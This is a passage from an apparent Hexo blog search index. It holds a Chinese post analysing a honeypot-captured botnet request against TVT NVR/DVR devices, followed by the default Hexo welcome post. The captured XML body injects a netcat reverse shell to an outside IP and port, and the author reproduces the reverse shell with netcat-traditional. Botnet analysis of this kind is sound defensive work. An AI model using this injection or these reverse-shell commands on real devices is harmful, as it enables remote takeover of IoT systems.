class="hljs-string">&quot;24.10.133.43&quot;</span>,<br><span class="hljs-attr">&quot;des_port&quot;</span>: <span class="hljs-string">&quot;81&quot;</span>,<br><span class="hljs-attr">&quot;protocol&quot;</span>: <span class="hljs-string">&quot;HTTP/1.1&quot;</span>,<br><span class="hljs-attr">&quot;path_info&quot;</span>: <span class="hljs-string">&quot;/editBlackAndWhiteList&quot;</span>,<br><span class="hljs-attr">&quot;query_string&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br><span class="hljs-attr">&quot;user_agent&quot;</span>: <span class="hljs-string">&quot;ApiTool&quot;</span>,<br><span class="hljs-attr">&quot;body&quot;</span>: <span class="hljs-string">&quot;&lt;?xml version=\&quot;1.0\&quot; encoding=\&quot;utf-8\&quot;?&gt;&lt;request version=\&quot;1.0\&quot; systemType=\&quot;NVMS-9000\&quot; clientType=\&quot;WEB\&quot;&gt;&lt;types&gt;&lt;filterTypeMode&gt;&lt;enum&gt;refuse&lt;/enum&gt;&lt;enum&gt;allow&lt;/enum&gt;&lt;/filterTypeMode&gt;&lt;addressType&gt;&lt;enum&gt;ip&lt;/enum&gt;&lt;enum&gt;iprange&lt;/enum&gt;&lt;enum&gt;mac&lt;/enum&gt;&lt;/addressType&gt;&lt;/types&gt;&lt;content&gt;&lt;switch&gt;true&lt;/switch&gt;&lt;filterType type=\&quot;filterTypeMode\&quot;&gt;refuse&lt;/filterType&gt;&lt;filterList type=\&quot;list\&quot;&gt;&lt;itemType&gt;&lt;addressType type=\&quot;addressType\&quot;/&gt;&lt;/itemType&gt;&lt;item&gt;&lt;switch&gt;true&lt;/switch&gt;&lt;addressType&gt;ip&lt;/addressType&gt;&lt;ip&gt;$(nc$&#123;IFS&#125;93.174.93.178$&#123;IFS&#125;31337$&#123;IFS&#125;-e$&#123;IFS&#125;$SHELL&amp;)&lt;/ip&gt;&lt;/item&gt;&lt;/filterList&gt;&lt;/content&gt;&lt;/request&gt;&quot;</span>,<br><span class="hljs-attr">&quot;sensor_ip&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br><span class="hljs-attr">&quot;container_id&quot;</span>: <span class="hljs-string">&quot;datanode&quot;</span>,<br><span class="hljs-attr">&quot;pot_version&quot;</span>: <span class="hljs-string">&quot;2019-09-26&quot;</span>,<br><span class="hljs-attr">&quot;content_type&quot;</span>: <span class="hljs-string">&quot;text/xml&quot;</span>,<br><span class="hljs-attr">&quot;HTTP_ACCEPT_ENCODING&quot;</span>: <span class="hljs-string">&quot;identity&quot;</span>,<br><span class="hljs-attr">&quot;HTTP_ACCEPT_LANGUAGE&quot;</span>: <span class="hljs-string">&quot;en-us&quot;</span>,<br><span class="hljs-attr">&quot;HTTP_HOST&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br><span class="hljs-attr">&quot;HTTP_ACCEPT&quot;</span>: <span class="hljs-string">&quot;*/*&quot;</span>,<br><span class="hljs-attr">&quot;HTTP_USER_AGENT&quot;</span>: <span class="hljs-string">&quot;ApiTool&quot;</span>,<br><span class="hljs-attr">&quot;HTTP_CONNECTION&quot;</span>: <span class="hljs-string">&quot;close&quot;</span>,<br><span class="hljs-attr">&quot;HTTP_CACHE_CONTROL&quot;</span>: <span class="hljs-string">&quot;max-age=0&quot;</span>,<br><span class="hljs-attr">&quot;HTTP_AUTHORIZATION&quot;</span>: <span class="hljs-string">&quot;Basic YWRtaW46ezEyMjEzQkQxLTY5QzctNDg2Mi04NDNELTI2MDUwMEQxREE0MH0=&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>经查证，该漏洞出现在<code>深圳市同为数码科技股份有限公司</code>的DVR、NVR、IPC以及其他OEM厂商的设备中，漏洞及POC详见：<a href="https://github.com/mcw0/PoC/blob/master/TVT_and_OEM_IPC_NVR_DVR_RCE_Backdoor_and_Information_Disclosure.txt" title="github POC">github</a></p><p>我发现，不同于一般僵尸网络直接投递样本，其执行的指令如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nc 93.174.93.178 31337 -e $SHELL&amp;<br></code></pre></td></tr></table></figure><p>这其实是僵尸网络在后台开一个反向shell让肉鸡连接C2，为了验证该方式的可行性，我开始尝试复现该反向shell的过程，但是在复现的过程中发现，我虚拟机中的ubuntu，自带的nc -e指令并不能使用。</p><h1 id="为什么nc-e无法使用"><a href="#为什么nc-e无法使用" class="headerlink" title="为什么nc -e无法使用"></a>为什么nc -e无法使用</h1><p>通常，ubuntu之类的linux发行版出于保护用户的安全，默认使用的是OpenBSD的netcat，该版本编译的nc并没有-e选项。查看自己的netcat版本：<code>nc -h</code></p><p><img src="https://pic.gaficat.com/security/nc%E7%89%88%E6%9C%AC.png" alt="默认版本"></p><p>那么应该如何解决使用上的限制呢？<strong>其实使用traditional版本的netcat即可。</strong></p><h1 id="traditional版本nc的安装和切换"><a href="#traditional版本nc的安装和切换" class="headerlink" title="traditional版本nc的安装和切换"></a>traditional版本nc的安装和切换</h1><h2 id="安装traditional版本nc"><a href="#安装traditional版本nc" class="headerlink" title="安装traditional版本nc"></a>安装traditional版本nc</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo apt-get inastll netcat-traditional<br></code></pre></td></tr></table></figure><h2 id="切换nc版本"><a href="#切换nc版本" class="headerlink" title="切换nc版本"></a>切换nc版本</h2><p>安装完成后，依然可以使用：<code>nc -h</code>查看版本，可以发现依然是OpenBSD版本的，此时需要切换版本。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo update-alternatives --config nc <br></code></pre></td></tr></table></figure><p>之后根据提示，输入对应序号，选择traditional版本即可。</p><p><img src="https://pic.gaficat.com/security/%E5%88%87%E6%8D%A2nc%E7%89%88%E6%9C%AC.png" alt="切换版本"></p><p>使用<code>nc -h</code>再次查看nc版本，发现已经支持-e选项了，注意<strong>dangerous！！</strong>标识。</p><p><img src="https://pic.gaficat.com/security/traditional%E7%89%88%E6%9C%AC%E7%9A%84nc.png" alt="traditional版本"></p><h1 id="反向shell验证过程"><a href="#反向shell验证过程" class="headerlink" title="反向shell验证过程"></a>反向shell验证过程</h1><p>反向shell可以分为控制端和受控端，控制端即为监听端口的服务器，受控端即为主动连接服务器的客户端。</p><h2 id="控制端"><a href="#控制端" class="headerlink" title="控制端"></a>控制端</h2><p>控制端监听端口即可：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nc -lvp 31337<br></code></pre></td></tr></table></figure><h2 id="受控端"><a href="#受控端" class="headerlink" title="受控端"></a>受控端</h2><p>受控端主动连接控制端，通过-e参数执行$SHELL环境变量（实际上对应的/bin/bash）。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nc xxx.xxx.xxx.xxx 31337 -e $SHELL<br></code></pre></td></tr></table></figure><h2 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h2><p>受控端已经将自己的bash交给了控制端：</p><img src="https://pic.gaficat.com/security/%E6%95%88%E6%9E%9C.png" alt="反向shell效果"  /><h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>这是我第一次捕获到僵尸网络针对物联网设备尝试使用反向shell来扩大规模，这种方式可以有效的避免蜜罐捕获其样本，对其进行跟踪分析。这种新的感染方式，应该引起研究人员注意。</p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>linux命令</tag>
      
      <tag>僵尸网络</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/posts/4a17b156.html"/>
    <url>/posts/4a17b156.html</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
